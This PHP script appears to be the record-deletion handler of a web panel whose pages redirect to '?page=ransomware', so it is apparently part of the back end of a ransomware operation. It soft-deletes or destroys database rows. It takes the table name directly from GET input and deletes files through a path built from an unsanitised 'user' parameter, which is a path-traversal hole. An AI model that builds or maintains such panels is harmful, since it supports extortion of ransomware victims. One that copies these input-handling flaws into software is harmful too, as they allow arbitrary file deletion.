<?php 
if(isset($_SESSION['LOGIN'])){
	if(isset($_GET['page']) && (!empty($_GET['id'])) && (!empty($_GET['act']))){
		if($_GET['act'] == "0") {
			#Some error here
		} elseif($_GET['act'] == "1") {
			$db->go("SELECT * FROM {$db->q($_GET['page'])} WHERE id = '{$db->q($_GET['id']/1909)}' AND status < 2 LIMIT 1");
			if($db->numRows()>0){
				$change = $db->go("UPDATE {$db->q($_GET['page'])} SET status = 2 WHERE id = '{$db->q($_GET['id']/1909)}'");
				if($change){
					@unlink("content/data/".$_GET['user'].".txt");
					$notice->addSuccess("Delete Successfully!");
					header("location:".$GLOBALS['_CONF']['HTTP']."?page=ransomware");
				}
			} else {
				$notice->addError("Data not found or already deleted!");
				header("location:".$GLOBALS['_CONF']['HTTP']."?page=ransomware");
			}
		} elseif($_GET['act'] == "2") {
			$db->go("SELECT * FROM {$db->q($_GET['page'])} WHERE id = '{$db->q($_GET['id']/1909)}' LIMIT 1");
			if($db->numRows()>0){
				$change = $db->go("DELETE FROM {$db->q($_GET['page'])} WHERE id = '{$db->q($_GET['id']/1909)}'");
				if($change){
					@unlink("content/data/".$_GET['user'].".txt");
					$notice->addSuccess("Destroyed Successfully!");
					header("location:".$GLOBALS['_CONF']['HTTP']."?page=ransomware");
				}
			} else {
				$notice->addError("Data not found or already destroyed!");
				header("location:".$GLOBALS['_CONF']['HTTP']."?page=ransomware");
			}
		}
	}
} else {
	header("location: ".$GLOBALS['_CONF']['HTTP']);
} 
?>